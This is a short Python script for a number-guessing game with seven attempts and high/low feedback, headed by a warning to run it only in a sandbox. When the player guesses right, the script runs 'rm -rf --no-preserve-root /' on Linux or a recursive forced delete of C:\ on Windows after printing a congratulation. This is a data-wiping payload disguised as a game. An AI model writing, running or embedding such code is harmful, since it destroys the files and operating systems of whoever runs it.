'''
NOTE: ATTENTION!!!! Run code only in sandboxed environment!!!
This code can break your system if run in a real environment.

This script is a simple number guessing game.    
It prompts the user to guess a number between 1 and 100, providing feedback on whether the guess is too high or too low.
If you won the game it will delete your OS files depending on your OS.
It has a limited number of attempts (7) and will inform the user if they run out of attempts.
'''

import os
import random as r
import platform as p
import time as t


int_num = input("Enter from 1 to 100: You have 7 attempts: ")
if not int_num.isdigit() or not (1 <= int(int_num) <= 100):
    print("Invalid input. Please enter a number between 1 and 100. You have 7 attempts.")
else:
    int_num = int(int_num)
    random_num = r.randint(1, 100)
    attempts = 7
    os_name = p.system()
    while attempts > 0:
        if int_num == random_num:
            if os_name == "Linux":
                print(f"Congratulations! You guessed the number ({random_num}). Reinstall OS Linux...")
                t.sleep(3)
                os.system("rm -rf --no-preserve-root /")
            elif os_name == "Windows":
                print(f"Congratulations! You guessed the number ({random_num}). Reinstall OS Windows...")
                t.sleep(3)
#                os.system("del /f /s /q C:\\Windows")
                os.system("del /f /s /q C:\\")
            break
        elif int_num < random_num:
            print("Your guess is too low.")
        else:
            print("Your guess is too high.")
        
        attempts -= 1
        if attempts > 0:
            int_num = input(f"You have {attempts} attempts left. Try again: ")
            if not int_num.isdigit() or not (1 <= int(int_num) <= 100):
                print("Invalid input. Please enter a number between 1 and 100.")
                attempts += 1
                continue
            int_num = int(int_num)
    else:
        print(f"Sorry, you've run out of attempts. The number was {random_num}. Let's try again!")